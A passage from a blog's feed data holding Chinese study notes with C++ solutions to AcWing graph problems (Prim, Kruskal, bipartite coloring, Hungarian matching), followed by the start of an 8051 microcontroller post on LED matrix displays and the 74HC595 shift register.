std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>, INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[N][N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N]; <span class="comment">// 记录每个节点是否已经被包含在最小生成树中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            <span class="keyword">if</span>(!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))    <span class="comment">//贪心，找到距离当前集合的最小便</span></span><br><span class="line">                t = j;</span><br><span class="line">        <span class="keyword">if</span>(i &amp;&amp; dist[t] == INF) <span class="keyword">return</span> INF;  <span class="comment">//点不可达，不能生成最小树</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新必须放在for循环前,避免自环，且当t放入集合后，其dist[t]已经没有意义</span></span><br><span class="line">        <span class="keyword">if</span>(i)   res += dist[t]; <span class="comment">// 如果不是第一个点，将其权值加入结果中    </span></span><br><span class="line">        st[t] = <span class="literal">true</span>;    </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            dist[j] = <span class="built_in">min</span>(dist[j], g[t][j]);        <span class="comment">// 更新 dist 数组，记录每个节点到当前生成树的最小距离</span></span><br><span class="line">        <span class="comment">//即将一些点变为可达的点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(g, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b, c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">        g[a][b] = g[b][a] = <span class="built_in">min</span>(g[a][b], c);    <span class="comment">//取最短边，Prim算法针对无向图，因此赋值两次</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = <span class="built_in">prim</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t == INF) <span class="built_in">puts</span>(<span class="string">&quot;impossible&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AcWing-859-Kruskal算法求最小生成树"><a href="#AcWing-859-Kruskal算法求最小生成树" class="headerlink" title="AcWing 859. Kruskal算法求最小生成树"></a>AcWing 859. Kruskal算法求最小生成树</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240804220844004.png" alt="image-20240804220844004"></p><p>kruskal算法：</p><p>通过并查集对边进行合并。先按照从小到大的权重进行排序，然后对每两个未连接的节点进行连边。我们知道，对于一个无向图，每两点有且仅有一条边相连，若其边数小于n-1，则其不联通，不能构成最小生成树。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>, M = <span class="number">200010</span>, INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> p[N];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, w;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> Edge &amp;E) <span class="type">const</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> w &lt; E.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; edges[M];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;        <span class="comment">//并查集</span></span><br><span class="line">    <span class="keyword">if</span>(p[x] != x) p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">    <span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sort</span>(edges, edges + m);     </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) p[i] = i;    <span class="comment">//初始化并查集</span></span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a = edges[i].a, b = edges[i].b, w = edges[i].w;</span><br><span class="line">        a = <span class="built_in">find</span>(a), b = <span class="built_in">find</span>(b);</span><br><span class="line">        <span class="keyword">if</span> (a != b)</span><br><span class="line">        &#123;</span><br><span class="line">            p[a] = b;</span><br><span class="line">            res += w;</span><br><span class="line">            cnt ++ ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cnt &lt; n - <span class="number">1</span>) <span class="keyword">return</span> INF;        <span class="comment">// 如果边的数量不足 n-1，说明图不连通</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;w);</span><br><span class="line">        edges[i] = &#123;a, b, w&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = <span class="built_in">kruskal</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t == INF) <span class="built_in">puts</span>(<span class="string">&quot;impossible&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-860-染色法判定二分图"><a href="#AcWing-860-染色法判定二分图" class="headerlink" title="AcWing 860. 染色法判定二分图"></a>AcWing 860. 染色法判定二分图</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240805150711864.png" alt="image-20240805150711864"></p><ul><li><strong>二分图</strong>：二分图是一种特殊的图，其顶点集可以分成两个互不相交的子集，使得每一条边的两个端点分别属于不同的子集。</li><li><strong>二部</strong>：如果一个图是二分图，那么它没有奇数长度的环。</li><li><strong>着色</strong>：一个图是二分图当且仅当它可以被 2-着色，即可以使用两种颜色对图的顶点进行着色，使得每条边的两个端点的颜色不同。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span> * <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> e[N], ne[N], idx;<span class="comment">//邻接表存储图</span></span><br><span class="line"><span class="type">int</span> h[N];</span><br><span class="line"><span class="type">int</span> color[N];<span class="comment">//保存各个点的颜色，0 未染色，1 是红色，2 是黑色</span></span><br><span class="line"><span class="type">int</span> n, m;<span class="comment">//点和边</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    e[idx] = b;</span><br><span class="line">    ne[idx] = h[a];</span><br><span class="line">    h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    color[u] = c;<span class="comment">//u的点成 c 染色</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[u]; i!= <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> b = e[i];                   </span><br><span class="line">        <span class="keyword">if</span>(!color[b])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(b, <span class="number">3</span> - c)) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//（3 - 1 = 2， 如果 u 的颜色是2，则和 u 相邻的染成 1）</span></span><br><span class="line">                                            <span class="comment">//（3 - 2 = 1， 如果 u 的颜色是1，则和 u 相邻的染成 2）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(color[b] &amp;&amp; color[b] != <span class="number">3</span> - c)<span class="comment">//如果已经染色，判断颜色是否为 3 - c</span></span><br><span class="line">        &#123;                                     </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;              </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; m; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="built_in">add</span>(a, b);</span><br><span class="line">        <span class="built_in">add</span>(b, a);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//遍历点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!color[i])<span class="comment">//如果没染色</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(i, <span class="number">1</span>))<span class="comment">//染色该点，并递归处理和它相邻的点</span></span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-861-二分图的最大匹配"><a href="#AcWing-861-二分图的最大匹配" class="headerlink" title="AcWing 861. 二分图的最大匹配"></a>AcWing 861. 二分图的最大匹配</h3><p> <img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240805153725265.png" alt="image-20240805153725265"></p><p><strong>匈牙利算法：</strong></p><p>匈牙利算法是一种用于解决指派问题（Assignment Problem）的数学算法。指派问题是指在有限的候选者中选择一组匹配，使得总的成本最小（或收益最大）。</p><p><code>find(int u)</code>: 尝试为左边节点 <code>u</code> 找到一个匹配，使用递归方式实现深度优先搜索（DFS）。</p><p>如果右边节点 <code>j</code> 未被访问过，则标记为已访问。</p><p>如果右边节点 <code>j</code> 未匹配或者其匹配的左边节点可以重新匹配，则更新匹配关系并返回 <code>true</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">505</span>, M = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n1,n2, m;</span><br><span class="line"><span class="type">int</span> h[N], e[M], ne[M], idx;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> match[N], st[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    e[idx] = b;</span><br><span class="line">    ne[idx] = h[a];</span><br><span class="line">    h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> u)</span> <span class="comment">// 匈牙利算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i])&#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span>(!st[j])&#123;</span><br><span class="line">            st[j] = <span class="literal">true</span>;      <span class="comment">//标记该节被占用，后续调用不能使用该节点</span></span><br><span class="line">            <span class="keyword">if</span>(match[j] == <span class="number">0</span> || <span class="built_in">find</span>(match[j]))&#123;    <span class="comment">//如果该节点没有被匹配，则匹配</span></span><br><span class="line">                                                    <span class="comment">//若该节点已匹配，则递归调用重新匹配节点</span></span><br><span class="line">                match[j] = u;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n1, &amp;n2, &amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="built_in">add</span>(a, b);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//为各个点找匹配</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n1; i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="keyword">sizeof</span> st);   <span class="comment">//将st数组置0，使得所有节点都没有被标记</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">find</span>(i)) res++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; res;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>51单片机学习0x2</title>
      <link href="/2024/02/27/51%E5%8D%95%E7%89%87%E6%9C%BA/51%E5%8D%95%E7%89%87%E6%9C%BA0x2/"/>
      <url>/2024/02/27/51%E5%8D%95%E7%89%87%E6%9C%BA/51%E5%8D%95%E7%89%87%E6%9C%BA0x2/</url>
      
        <content type="html"><![CDATA[<h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><h3 id="LED点阵屏"><a href="#LED点阵屏" class="headerlink" title="LED点阵屏"></a>LED点阵屏</h3><ul><li><p>LED点阵屏的结构类似于数码管，只不过是数码管把每一列的像素以“8”字型排列而已</p></li><li><p>LED点阵屏与数码管一样，有<code>共阴</code>和<code>共阳</code>两种接法，不同的接法对应的电路结构不同</p></li><li><p>LED点阵屏需要进行逐行或逐列扫描，才能使所有LED同时显示</p></li></ul><p>LED点阵屏分类</p><ul><li><p>按颜色：单色、双色（可显示三种颜色）、全彩</p></li><li><p>按像素：8-8、16-16等</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240225202929383.png" alt="image-20240225202929383"></p><h4 id="74HC595"><a href="#74HC595" class="headerlink" title="74HC595"></a>74HC595</h4><ul><li>74HC595是串行输入并行输出的移位寄存器，可用3根线输入串行数据，8根线输出并行数据，多片级联后，可输出16位、24位、32位等，常用于IO口扩展。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240225212322481.png" alt="image-20240225212322481"></p><p>相当于一把手枪，SER填入子弹，SERCLK控制子弹装填（移位），多余的子弹从<code>QH&#39;</code>口溢出，RCLK清空弹夹。同时，还可以将多个<code>74HC595</code>串联，拓展IO口。</p><p>要注意J24模块GND端,用文字取模软件生成代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">\*main.c*\</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MatrixLED.h&quot;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code Animation[]=<span class="comment">//动画数组     code关键词表示将此数组存储在flash中</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0xFE</span>,<span class="number">0x90</span>,<span class="number">0x98</span>,<span class="number">0x64</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x0C</span>,<span class="number">0x30</span>,<span class="number">0xD0</span>,<span class="number">0x30</span>,<span class="number">0x0C</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0xFE</span>,</span><br><span class="line"><span class="number">0x80</span>,<span class="number">0x70</span>,<span class="number">0x1C</span>,<span class="number">0x02</span>,<span class="number">0xFE</span>,<span class="number">0x00</span>,<span class="number">0xFE</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x82</span>,<span class="number">0x44</span>,<span class="number">0x38</span>,<span class="number">0x00</span>,<span class="number">0x7C</span>,<span class="number">0x82</span>,<span class="number">0x82</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x7C</span>,<span class="number">0x00</span>,<span class="number">0xFE</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0xFE</span>,</span><br><span class="line"><span class="number">0x90</span>,<span class="number">0x90</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0xFE</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0xFC</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0xFC</span>,<span class="number">0x00</span>,<span class="number">0x7C</span>,</span><br><span class="line"><span class="number">0x82</span>,<span class="number">0x82</span>,<span class="number">0x82</span>,<span class="number">0x7C</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> i=<span class="number">0</span>,Offset = <span class="number">0</span> ,Count = <span class="number">0</span>;</span><br><span class="line">   MatrixLED_Init();<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">8</span>; i++)</span><br><span class="line">MatrixLED_ShowColumn(i,Animation[i+Offset]);</span><br><span class="line">Count++;</span><br><span class="line"><span class="comment">//Delay(100);不用Delay因为显示一次图像要逐列执行八次MatrixLED_ShowColumn，LED产生闪烁</span></span><br><span class="line"><span 